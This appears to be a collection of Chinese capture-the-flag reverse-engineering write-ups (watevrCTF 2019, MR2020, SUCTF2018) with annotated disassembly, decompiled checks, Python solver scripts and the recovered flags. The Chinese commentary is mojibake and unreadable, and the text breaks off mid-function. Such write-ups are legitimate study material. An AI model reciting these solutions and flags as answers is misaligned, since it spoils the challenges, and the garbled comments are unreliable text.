00007FF7A8AC5A5F mov rdi,rsp 00007FF7A8AC5A62 mov ecx,8Eh 00007FF7A8AC5A67 mov eax,0CCCCCCCCh 00007FF7A8AC5A6C rep stos dword ptr [rdi] 00007FF7A8AC5A6E mov rax,qword ptr [__security_cookie (07FF7A8AD3018h)] 00007FF7A8AC5A75 xor rax,rbp 00007FF7A8AC5A78 mov qword ptr [rbp+208h],rax 00007FF7A8AC5A7F lea rcx,[__06A15900_ConsoleApplication@cpp (07FF7A8AD902Ah)] 00007FF7A8AC5A86 call __CheckForDebuggerJustMyCode (07FF7A8AC1122h) 00007FF7A8AC5A8B lea rdx,[string \u0026#34;flag{this_is_a_fake_flag}\u0026#34; (07FF7A8ACF450h)] 00007FF7A8AC5A92 lea rcx,[flag] 00007FF7A8AC5A96 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt; (07FF7A8AC15E1h) 00007FF7A8AC5A9B nop 00007FF7A8AC5A9C mov dword ptr [p],0 00007FF7A8AC5AA3 mov i,0 00007FF7A8AC5AAA jmp main+64h (07FF7A8AC5AB4h) 00007FF7A8AC5AAC mov eax,i 00007FF7A8AC5AAF inc eax 00007FF7A8AC5AB1 mov i,eax 00007FF7A8AC5AB4 movsxd rax,i 00007FF7A8AC5AB8 mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5ABF lea rcx,[flag] 00007FF7A8AC5AC3 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::length (07FF7A8AC122Bh) 00007FF7A8AC5AC8 mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5ACF cmp rcx,rax 00007FF7A8AC5AD2 jae main+1B2h (07FF7A8AC5C02h) ; æ— ç¬¦å·æ•°æ¯”è¾ƒï¼Œå¤§äºæˆ–ç­‰äºæ—¶è·³è½¬ 00007FF7A8AC5AD8 mov eax,i 00007FF7A8AC5ADB and eax,1 ; å–æœ€å1ä½ 00007FF7A8AC5ADE cmp eax,1 ; åˆ¤æ–­å¥‡å¶ 00007FF7A8AC5AE1 jne main+126h (07FF7A8AC5B76h) ; å¶æ•°è·³è½¬ï¼ˆä¸ç›¸ç­‰è·³è½¬ï¼‰ 00007FF7A8AC5AE7 movsxd rax,i 00007FF7A8AC5AEB mov rdx,rax 00007FF7A8AC5AEE lea rcx,[flag] 00007FF7A8AC5AF2 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::operator[] (07FF7A8AC1442h) 00007FF7A8AC5AF7 movsx eax,byte ptr [rax] ; å–flagç¬¬iä½ 00007FF7A8AC5AFA xor eax,42h ; ä¸0x42å¼‚æˆ– 00007FF7A8AC5AFD mov dword ptr [p],eax ; å¼‚æˆ–ç»“æœç§»åˆ°å†…å­˜ä¸­ 00007FF7A8AC5B00 mov dl,30h 00007FF7A8AC5B02 lea rcx,[rbp+144h] 00007FF7A8AC5B09 call std::setfill\u0026lt;char\u0026gt; (07FF7A8AC1046h) ; ç”¨å­—ç¬¦\u0026#39;0\u0026#39;è¿›è¡Œå¡«å…… 00007FF7A8AC5B0E mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5B15 mov edx,2 00007FF7A8AC5B1A lea rcx,[rbp+168h] 00007FF7A8AC5B21 call std::setw (07FF7A8AC10D2h) ; å¡«å……è‡³2ä½ 00007FF7A8AC5B26 mov qword ptr [rbp+200h],rax 00007FF7A8AC5B2D lea rdx,[std::hex (07FF7A8AC1488h)] ; ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡º 00007FF7A8AC5B34 mov rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)] 00007FF7A8AC5B3B call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7160h)] 00007FF7A8AC5B41 mov rcx,qword ptr [rbp+200h] 00007FF7A8AC5B48 mov rdx,rcx 00007FF7A8AC5B4B mov rcx,rax 00007FF7A8AC5B4E call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,__int64\u0026gt; (07FF7A8AC12F8h) 00007FF7A8AC5B53 mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5B5A mov rdx,rcx 00007FF7A8AC5B5D mov rcx,rax 00007FF7A8AC5B60 call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,char\u0026gt; (07FF7A8AC11A4h) 00007FF7A8AC5B65 mov edx,dword ptr [p] 00007FF7A8AC5B68 mov rcx,rax 00007FF7A8AC5B6B call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7158h)] 00007FF7A8AC5B71 jmp main+1ADh (07FF7A8AC5BFDh) 00007FF7A8AC5B76 movsxd rax,i ; å¶æ•°æ—¶è·³è½¬åˆ°è¿™é‡Œï¼Œä¸å¥‡æ•°å”¯ä¸€çš„åŒºåˆ«ä¸ºæ²¡æœ‰å¼‚æˆ–è¿ç®— 00007FF7A8AC5B7A mov rdx,rax 00007FF7A8AC5B7D lea rcx,[flag] 00007FF7A8AC5B81 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::operator[] (07FF7A8AC1442h) 00007FF7A8AC5B86 movsx eax,byte ptr [rax] 00007FF7A8AC5B89 mov dword ptr [p],eax 00007FF7A8AC5B8C mov dl,30h 00007FF7A8AC5B8E lea rcx,[rbp+194h] 00007FF7A8AC5B95 call std::setfill\u0026lt;char\u0026gt; (07FF7A8AC1046h) 00007FF7A8AC5B9A mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5BA1 mov edx,2 00007FF7A8AC5BA6 lea rcx,[rbp+1B8h] 00007FF7A8AC5BAD call std::setw (07FF7A8AC10D2h) 00007FF7A8AC5BB2 mov qword ptr [rbp+200h],rax 00007FF7A8AC5BB9 lea rdx,[std::hex (07FF7A8AC1488h)] 00007FF7A8AC5BC0 mov rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)] 00007FF7A8AC5BC7 call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7160h)] 00007FF7A8AC5BCD mov rcx,qword ptr [rbp+200h] 00007FF7A8AC5BD4 mov rdx,rcx 00007FF7A8AC5BD7 mov rcx,rax 00007FF7A8AC5BDA call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,__int64\u0026gt; (07FF7A8AC12F8h) 00007FF7A8AC5BDF mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5BE6 mov rdx,rcx 00007FF7A8AC5BE9 mov rcx,rax 00007FF7A8AC5BEC call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,char\u0026gt; (07FF7A8AC11A4h) 00007FF7A8AC5BF1 mov edx,dword ptr [p] 00007FF7A8AC5BF4 mov rcx,rax 00007FF7A8AC5BF7 call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7158h)] 00007FF7A8AC5BFD jmp main+5Ch (07FF7A8AC5AACh) 00007FF7A8AC5C02 mov dword ptr [rbp+1E4h],0 00007FF7A8AC5C0C lea rcx,[flag] 00007FF7A8AC5C10 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::~basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt; (07FF7A8AC1302h) 00007FF7A8AC5C15 mov eax,dword ptr [rbp+1E4h] 00007FF7A8AC5C1B mov edi,eax 00007FF7A8AC5C1D lea rcx,[rbp-20h] 00007FF7A8AC5C21 lea rdx,[__xt_z+540h (07FF7A8ACEFE0h)] 00007FF7A8AC5C28 call _RTC_CheckStackVars (07FF7A8AC1596h) 00007FF7A8AC5C2D mov eax,edi 00007FF7A8AC5C2F mov rcx,qword ptr [rbp+208h] 00007FF7A8AC5C36 xor rcx,rbp 00007FF7A8AC5C39 call __security_check_cookie (07FF7A8AC1190h) 00007FF7A8AC5C3E lea rsp,[rbp+218h] 00007FF7A8AC5C45 pop rdi 00007FF7A8AC5C46 pop rbp 00007FF7A8AC5C47 ret ç®€å•çš„è¯´ï¼Œè¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œæ ¹æ® i çš„å¥‡å¶è¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å¦ä¸ 0x42 è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åå°†ç»“æœä»¥ 2 ä½åå…­è¿›åˆ¶è¾“å‡ºï¼Œæ‰€ä»¥åªéœ€è¦è¿›è¡Œåå‘æ±‚è§£å³å¯\nfrom libnum import n2s cipher = n2s(0x662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d) for i in range(len(cipher)): if i \u0026amp; 1 == 1: print (chr(cipher[i] ^ 0x42), end = \u0026#39;\u0026#39;) else: print (chr(cipher[i]), end = \u0026#39;\u0026#39;) # flag{d0_y0u_know_x86-64_a5m?} [watevrCTF 2019]Repyc 010çœ‹ä¸€çœ¼ï¼Œå‘ç°æ–‡ä»¶å¤´å¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œç›´æ¥ç”¨ uncompyle6 è½¬æˆpythonæ–‡ä»¶\nå’ŒVNçš„é¢˜ä¸€æ ·ï¼Œå˜é‡éƒ½æˆäº†ä¹±ç ï¼Œé˜…è¯»ä¸€ä¸‹ç„¶åæ”¹ä¸€æ”¹\nzero = 0 one = 1 two = 2 def function(op): i = zero list_a = [zero] * two ** (two * two) # [0] * 16 list_b = [zero] * 100 list_c = [] while op[i][zero] != \u0026#39;nop\u0026#39;: print (i, op[i]) cur = op[i][zero].lower() args = op[i][one:] if cur == \u0026#39;add\u0026#39;: list_a[args[zero]] = list_a[args[one]] + list_a[args[two]] elif cur == \u0026#39;xor\u0026#39;: list_a[args[zero]] = list_a[args[one]] ^ list_a[args[two]] elif cur == \u0026#39;sub\u0026#39;: list_a[args[zero]] = list_a[args[one]] - list_a[args[two]] elif cur == \u0026#39;mul\u0026#39;: list_a[args[zero]] = list_a[args[one]] * list_a[args[two]] elif cur == \u0026#39;div\u0026#39;: list_a[args[zero]] = list_a[args[one]] / list_a[args[two]] elif cur == \u0026#39;and\u0026#39;: list_a[args[zero]] = list_a[args[one]] \u0026amp; list_a[args[two]] elif cur == \u0026#39;or\u0026#39;: list_a[args[zero]] = list_a[args[one]] | list_a[args[two]] elif cur == \u0026#39;nothing\u0026#39;: list_a[args[zero]] = list_a[args[zero]] elif cur == \u0026#39;mov\u0026#39;: list_a[args[zero]] = args[one] elif cur == \u0026#39;set_a\u0026#39;: list_a[args[zero]] = list_b[args[one]] elif cur == \u0026#39;clear\u0026#39;: list_a[args[zero]] = zero elif cur == \u0026#39;input_b\u0026#39;: list_b[args[zero]] = input(list_a[args[one]]) elif cur == \u0026#39;print_a\u0026#39;: print(list_a[args[zero]]) elif cur == \u0026#39;c_pop\u0026#39;: i = list_c.pop() elif cur == \u0026#39;append_c\u0026#39;: list_a[7] = zero for j in range(len(list_a[args[zero]])): if list_a[args[zero]] != list_a[args[one]]: list_a[7] = one i = list_a[args[two]] list_c.append(i) elif cur == \u0026#39;xor_a\u0026#39;: str_next = \u0026#39;\u0026#39; for j in range(len(list_a[args[zero]])): str_next += chr(ord(list_a[args[zero]][j]) ^ list_a[args[one]]) list_a[args[zero]] = str_next elif cur == \u0026#39;sub_a\u0026#39;: str_next = \u0026#39;\u0026#39; for j in range(len(list_a[args[zero]])): str_next += chr(ord(list_a[args[zero]][j]) - list_a[args[one]]) list_a[args[zero]] = str_next print (list_a) print (list_b) print (list_c) print () i += one function( [ [ \u0026#39;mov\u0026#39;, zero, \u0026#39;Authentication token: \u0026#39;], # å°†è¿™ä¸ªå­—ç¬¦ä¸²æ”¾åˆ°list açš„0å·ä½ç½® [ \u0026#39;input_b\u0026#39;, zero, zero], # å°†è¾“å…¥æ”¾åˆ°list bçš„0å·ä½ç½® [ \u0026#39;mov\u0026#39;, 6, \u0026#39;Ã¡Ã—Ã¤Ã“Ã¢Ã¦Ã­Ã¤Ã ÃŸÃ¥Ã‰Ã›Ã£Ã¥Ã¤Ã‰Ã–Ã“Ã‰Ã¤Ã Ã“Ã‰Ã–Ã“Ã¥Ã¤Ã‰Ã“ÃšÃ•Ã¦Ã¯Ã¨Ã¤ÃŸÃ™ÃšÃ‰Ã›Ã“Ã¤Ã Ã™Ã”Ã‰Ã“Ã¢Ã¦Ã‰Ã Ã“ÃšÃ•Ã“Ã’Ã™Ã¦Ã¤Ã Ã‰Ã¤Ã ÃŸÃ¥Ã‰ÃŸÃ¥Ã‰Ã¤Ã Ã“Ã‰ÃšÃ“Ã¡Ã‰Â·Ã”Ã¢Ã—ÃšÃ•Ã“Ã”Ã‰Â³ÃšÃ•Ã¦Ã¯Ã¨Ã¤ÃŸÃ™ÃšÃ‰Ã…Ã¤Ã—ÃšÃ”Ã—Ã¦Ã”Ã‰Ã—ÃšÃ¯Ã¡Ã—Ã¯Ã¥Ã‰ÃŸÃ‰Ã”Ã™ÃšÃ¤Ã‰Ã¦Ã“Ã—ÃœÃœÃ¯Ã‰Ã Ã—Ã¢Ã“Ã‰Ã—Ã‰Ã‘Ã™Ã™Ã”Ã‰Ã¢ÃŸÃ”Ã‰Ã–Ã£Ã¤Ã‰ÃŸÃ‰Ã¦Ã“Ã—ÃœÃœÃ¯Ã‰Ã“ÃšÃÃ™Ã¯Ã‰Ã¤Ã ÃŸÃ¥Ã‰Ã¥Ã™ÃšÃ‘Ã‰ÃŸÃ‰Ã Ã™Ã¨Ã“Ã‰Ã¯Ã™Ã£Ã‰Ã¡ÃŸÃœÃœÃ‰Ã“ÃšÃÃ™Ã¯Ã‰ÃŸÃ¤Ã‰Ã—Ã¥Ã¡Ã“ÃœÃœ\\x97Ã‰Ã¯Ã™Ã£Ã¤Ã£Ã–Ã“\\x9aÃ•Ã™Ã›\\x99Ã¡Ã—Ã¤Ã•Ã Â©Ã¢Â«Â³Â£Ã¯Â²Ã•Ã”ÃˆÂ·Â±Ã¢Â¨Ã«\u0026#39;], # å°†è¿™ä¸ªå­—ç¬¦ä¸²æ”¾åˆ°list açš„6å·ä½ç½® [ \u0026#39;mov\u0026#39;, two, two ** (3 * two + one) - two ** (two + one)], # å°†120æ”¾åˆ°list açš„2å·ä½ç½® [ \u0026#39;mov\u0026#39;, 4, 15], # å°†15æ”¾åˆ°list açš„4å·ä½ç½® [ \u0026#39;mov\u0026#39;, 3, one], # å°†1æ”¾åˆ°list açš„3å·ä½ç½® [ \u0026#39;mul\u0026#39;, two, two, 3], # list açš„2å·ä½ç½®ç­‰äº2å·ä½ç½®*3å·ä½ç½®ï¼Œå³ä¸å˜ [ \u0026#39;add\u0026#39;, two, two, 4], # list açš„2å·ä½ç½®ç­‰äº2å·ä½ç½®+4å·ä½ç½®ï¼Œå³120å˜ä¸º135 [ \u0026#39;nothing\u0026#39;, zero, two], [ \u0026#39;clear\u0026#39;, 3], # list açš„3å·ä½ç½®æ¸…é›¶ [ \u0026#39;xor_a\u0026#39;, 6, 3], # 6å·ä½ç½®ä¸­æ¯ä¸€ä¸ªå­—ç¬¦ä¸3å¼‚æˆ– [ \u0026#39;mov\u0026#39;, zero, \u0026#39;Thanks.\u0026#39;], [ \u0026#39;mov\u0026#39;, one, \u0026#39;Authorizing access...\u0026#39;], [ \u0026#39;print_a\u0026#39;, zero], [ \u0026#39;set_a\u0026#39;, zero, zero], [ \u0026#39;xor_a\u0026#39;, zero, two], # è¾“å…¥å¼‚æˆ–135 [ \u0026#39;sub_a\u0026#39;, zero, 4], # è¾“å…¥å‡15 [ \u0026#39;mov\u0026#39;, 5, 19], [ \u0026#39;append_c\u0026#39;, zero, 6, 5], [ \u0026#39;print_a\u0026#39;, one], [ \u0026#39;nop\u0026#39;], [ \u0026#39;mov\u0026#39;, one, \u0026#39;Access denied!\u0026#39;], [ \u0026#39;print_a\u0026#39;, one], [ \u0026#39;nop\u0026#39;] ] ) å°†è¿‡ç¨‹å˜é‡è¾“å‡ºå½“ä½œåŠ¨è°ƒï¼Œå°±æ¯”è¾ƒå®¹æ˜“çœ‹æ‡‚æ¯æ¡æŒ‡ä»¤åœ¨å¹²ä»€ä¹ˆäº†\næœ€åå‘ç°æœ‰ç”¨çš„å°±æ˜¯å¼‚æˆ–135å’Œå‡15ï¼ŒçŒœflagå¤´æ˜¯ watevrï¼Œæœç„¶å’Œå¯†æ–‡å‰6ä¸ªå­—ç¬¦å¯¹ä¸Šäº†\næ‰€ä»¥ç›´æ¥ä¸€ä¸ªè§£å¯†å°±è¡Œ\ncipher = \u0026#39;Ã¡Ã—Ã¤Ã“Ã¢Ã¦Ã­Ã¤Ã ÃŸÃ¥Ã‰Ã›Ã£Ã¥Ã¤Ã‰Ã–Ã“Ã‰Ã¤Ã Ã“Ã‰Ã–Ã“Ã¥Ã¤Ã‰Ã“ÃšÃ•Ã¦Ã¯Ã¨Ã¤ÃŸÃ™ÃšÃ‰Ã›Ã“Ã¤Ã Ã™Ã”Ã‰Ã“Ã¢Ã¦Ã‰Ã Ã“ÃšÃ•Ã“Ã’Ã™Ã¦Ã¤Ã Ã‰Ã¤Ã ÃŸÃ¥Ã‰ÃŸÃ¥Ã‰Ã¤Ã Ã“Ã‰ÃšÃ“Ã¡Ã‰Â·Ã”Ã¢Ã—ÃšÃ•Ã“Ã”Ã‰Â³ÃšÃ•Ã¦Ã¯Ã¨Ã¤ÃŸÃ™ÃšÃ‰Ã…Ã¤Ã—ÃšÃ”Ã—Ã¦Ã”Ã‰Ã—ÃšÃ¯Ã¡Ã—Ã¯Ã¥Ã‰ÃŸÃ‰Ã”Ã™ÃšÃ¤Ã‰Ã¦Ã“Ã—ÃœÃœÃ¯Ã‰Ã Ã—Ã¢Ã“Ã‰Ã—Ã‰Ã‘Ã™Ã™Ã”Ã‰Ã¢ÃŸÃ”Ã‰Ã–Ã£Ã¤Ã‰ÃŸÃ‰Ã¦Ã“Ã—ÃœÃœÃ¯Ã‰Ã“ÃšÃÃ™Ã¯Ã‰Ã¤Ã ÃŸÃ¥Ã‰Ã¥Ã™ÃšÃ‘Ã‰ÃŸÃ‰Ã Ã™Ã¨Ã“Ã‰Ã¯Ã™Ã£Ã‰Ã¡ÃŸÃœÃœÃ‰Ã“ÃšÃÃ™Ã¯Ã‰ÃŸÃ¤Ã‰Ã—Ã¥Ã¡Ã“ÃœÃœ\\x97Ã‰Ã¯Ã™Ã£Ã¤Ã£Ã–Ã“\\x9aÃ•Ã™Ã›\\x99Ã¡Ã—Ã¤Ã•Ã Â©Ã¢Â«Â³Â£Ã¯Â²Ã•Ã”ÃˆÂ·Â±Ã¢Â¨Ã«\u0026#39; for c in cipher: print (chr((ord(c) + 15) ^ 135), end = \u0026#39;\u0026#39;) # watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0} [watevrCTF 2019]esreveR ç”¨idaæ‰“å¼€åï¼Œå‘ç°å¤§é‡ä¸è¾“å…¥æ— å…³çš„è®¡ç®—ï¼Œäºæ˜¯å†³å®šå…ˆé™æ€è·Ÿè¸ªä¸€ä¸‹è¾“å…¥ï¼Œç„¶åå†åŠ¨è°ƒçœ‹è¿‡ç¨‹æ•°æ®\nå’Œè¾“å…¥æœ‰å…³çš„å¤§æ¦‚æ˜¯è¿™äº›ï¼ˆåŠ¨è°ƒåå†™çš„wpï¼Œæ‰€ä»¥åŸºåœ°å€æ”¹å˜äº†ï¼‰\nfgets(s, n[0], stdin); v8 = sub_5578E4A20943(n[0]); *(_QWORD *)n = sub_5578E4A20996(v14); if ( *(_QWORD *)n != v8 ) { v11 = sub_5578E4A209E9(4521); if ( s != (char *)v11 ) { v4 = sub_5578E4A212D8((__int64)s, v15, v10, v9, v11, v13); if ( v4 != v15 * ((v12 ^ v13) - *(_QWORD *)n) ) puts(\u0026#34;Congratulations! You reversed the reversed reverse!\u0026#34;); } } å‘ç°è¾“å…¥åªè¦è¾“å…¥çš„åœ°å€ä¸ç­‰äºä¸€ä¸ªæ•°ï¼Œç„¶åé€šè¿‡æŸä¸ªåˆ¤æ–­å°±è¡Œï¼Œäºæ˜¯å†è¿›åˆ°åˆ¤æ–­å‰çš„å‡½æ•°\nä¼šçœ‹åˆ°ä¸€ä¸ªè¾“å…¥å‚æ•°å¾ˆå¤šçš„å‡½æ•°ï¼Œè¿›å»çœ‹ä¸€ä¸‹\nv58 = a1 == *a57; if ( a2 != a57[1] ) v58 = 0; if ( a3 != a57[2] ) v58 = 0; if ( a4 != a57[3] ) v58 = 0; if ( a5 != a57[4] ) v58 = 0; // ä»¥ä¸‹çœç•¥ è¾“å…¥äº†57ä¸ªå‚æ•°ï¼Œè€Œä¸”å°±æ˜¯åˆ¤æ–­æ˜¯å¦ç›¸åŒçš„ï¼Œç›¸åŒå°±è¿”å›1ï¼Œå¦åˆ™è¿”å›0\näºæ˜¯çŒœæµ‹è¿™é‡Œå°±æ˜¯æœ€ç»ˆçš„éªŒè¯å‡½æ•°\nä¸­é—´ç»è¿‡äº†ä¸€ç³»åˆ—åŠ¨è°ƒï¼Œç¡®å®šå…¶å®ƒçš„è¿‡ç¨‹æ²¡ä»€ä¹ˆå½±å“ï¼Œäºæ˜¯åœ¨è¿›å…¥å‡½æ•°å‰ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åç›´æ¥å»rspçš„åœ°å€é‡Œæ‰¾æ¯”è¾ƒçš„æ•°æ®\næœ€åçš„å†…å­˜æ•°æ®\n[stack]:00007FFF9B4402F0 dq \u0026#39;{\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;e\u0026#39; [stack]:00007FFF9B4402F0 dq \u0026#39;d\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;a\u0026#39; [stack]:00007FFF9B4402F0 dq \u0026#39;t\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;5\u0026#39; [stack]:00007FFF9B4402F0 dq \u0026#39;E\u0026#39;, \u0026#39;}\u0026#39; è¿æ¥èµ·æ¥å°±æ˜¯flagäº†\n{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E} firmware ä¸€é“æ°´é¢˜ï¼Œä¸»è¦å­¦ä¹ ä¸€ä¸‹å·¥æ§é€†å‘\nä¸éš¾çœ‹å‡ºï¼Œç»™çš„é™„ä»¶æ˜¯squashfsæ–‡ä»¶ï¼Œç›´æ¥è¿›è¡Œbinwalk\nåœ¨å®‰è£…sasquatchæ—¶é‡åˆ°äº†ä¸€äº›å‘ï¼Œå¥½åƒå¿…é¡»cloneåˆ°~/Downloadsç­‰æ–‡ä»¶å¤¹å†…æ‰è¡Œ\nbinwalkä¹‹åé€›ä¸€ä¸‹ç›®å½•ï¼Œèƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªå«åš backdoor çš„äºŒè¿›åˆ¶æ–‡ä»¶\nç›®æ ‡æ˜¯æ‰¾åˆ°è¿æ¥çš„ipå’Œç«¯å£ï¼Œè¿›å»æ‰¾ä¸€æ‰¾å°±èƒ½çœ‹åˆ°\n[MR2020]Shit è¿™é¢˜æœ€åçš„è§£æ³•å¾ˆå±‘ï¼ˆ\né¦–å…ˆæ˜¯å»èŠ±ï¼Œä½†èŠ±æŒ‡ä»¤å’ŒCISCN2021-Nçš„RE2ä¸€æ ·ï¼Œå°±ä¸ç»†è¯´äº†\nä¸€ç›´å°è¯•åè°ƒè¯•ï¼Œä½†ä¸€ç›´æ²¡æˆåŠŸï¼Œå°±ç”¨çˆ†ç ´æ¥è§£äº†\u0026hellip;\nchar __cdecl sub_DA12F0(const char *a1) { int v2; // [esp+14h] [ebp-14h] int i; // [esp+1Ch] [ebp-Ch] int v4; // [esp+20h] [ebp-8h] int v5; // [esp+20h] [ebp-8h] v2 = 0; for ( i = 0; i \u0026lt; strlen(a1); i += 4 ) { v4 = __ROR4__(a1[i + 3] | (a1[i + 2] \u0026lt;\u0026lt; 8) | (a1[i + 1] \u0026lt;\u0026lt; 16) | (a1[i] \u0026lt;\u0026lt; 24), dword_DA5034[i / 4]); v5 = ((v4 \u0026lt;\u0026lt; 16) | (unsigned __int16)~HIWORD(v4)) ^ (1 \u0026lt;\u0026lt; dword_DA5034[i / 4]); if ( i \u0026gt; 0 ) v5 ^= v2; v2 = v5; if ( v5 != dword_DA5018[i / 4] ) return 0; } return 1; } æ—¢ç„¶æ¯å››ä½è¿›è¡Œä¸€ç³»åˆ—ä½è¿ç®—ï¼Œä¸”å¯†é’¥åªæœ‰å…­ä½ï¼Œé‚£å°±çˆ†ç ´å§\nfrom libnum import * a = [0x8C2C133A, 0x0F74CB3F6, 0x0FEDFA6F2, 0x0AB293E3B, 0x26CF8A2A, 0x88A1F279] for t in range(len(a)): for i in range(32): tmp = a[t] if t != 0: tmp = tmp ^ a[t - 1] tmp = tmp ^ (1 \u0026lt;\u0026lt; i) tmp = ((~tmp \u0026amp; 0xffff) \u0026lt;\u0026lt; 16) | (tmp \u0026gt;\u0026gt; 16) res = n2s(((tmp \u0026gt;\u0026gt; (0x20 - i)) | (tmp \u0026lt;\u0026lt; i)) \u0026amp; 0xffffffff) if res[0] \u0026gt; 0x20 and res[0] \u0026lt; 0x7f: if res[1] \u0026gt; 0x20 and res[1] \u0026lt; 0x7f: if res[2] \u0026gt; 0x20 and res[2] \u0026lt; 0x7f: if res[3] \u0026gt; 0x20 and res[3] \u0026lt; 0x7f: print (res) print () æœ€åç”šè‡³ç›´æ¥ä¸Šå››ä¸ª if äº†\u0026hellip;\nçˆ†ç ´ç»“æœ\nb\u0026#39;flag\u0026#39; # å¿…é€‰ b\u0026#39;,ag\u0026amp;\u0026#39; b\u0026#34;a\u0026#39;f,\u0026#34; b\u0026#39;gf,!\u0026#39; b\u0026#39;_2{`\u0026#39; b\u0026#39;3{`^\u0026#39; b\u0026#39;{a_3\u0026#39; # å¿…é€‰ b\u0026#39;`_3z\u0026#39; b\u0026#39;[a2}\u0026#39; b\u0026#39;a2y_\u0026#39; # å‰©ä¸‹ä¸‰ä¸ªæœ‰å¤§æ‹¬å·ï¼Œæ’é™¤ b\u0026#39;6}_a\u0026#39; b\u0026#39;}_e2\u0026#39; b\u0026#39;re_f\u0026#39; b\u0026#39;e_gs\u0026#39; b\u0026#39;^fse\u0026#39; b\u0026#39;fsd_\u0026#39; b\u0026#39;_4o2\u0026#39; b\u0026#39;or_t\u0026#39; b\u0026#39;2_t/\u0026#39; b\u0026#39;=%st\u0026#39; b\u0026#39;est}\u0026#39; # å¿…é€‰ b\u0026#39;s4=e\u0026#39; b\u0026#39;t=e3\u0026#39; ä¸­é—´æ ¹æ®å‰åå•è¯æ‹¼æ¥ä¸€ä¸‹å°±è¡Œäº†\nShitè¿™é“é¢˜è¿˜æ˜¯è¦çœ‹ä¸€ä¸‹åˆ«äººçš„WPï¼Œå­¦ä¹ ä¸€ä¸‹æ­£ç¡®çš„æ€è·¯ [SUCTF2018]HelloPython uncompyle6\n(lambda __target: [ (lambda __target: [ [ __this() for __g[\u0026#39;n\u0026#39;] in [__operator.isub(__g[\u0026#39;n\u0026#39;], 1)] ][0] for __target.value in [__operator.iadd(__target.value, (y.value \u0026lt;\u0026lt; 4) + k[2] ^ y.value + x.value ^ (y.value \u0026gt;\u0026gt; 5) + k[3])] ][0])(z) for __target.value in [__operator.iadd(__target.value, (z.value \u0026lt;\u0026lt; 4) + k[0] ^ z.value + x.value ^ (z.value \u0026gt;\u0026gt; 5) + k[1])] ][0])(y) å¾ˆæ˜æ˜¾æ˜¯tea\nvoid encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], 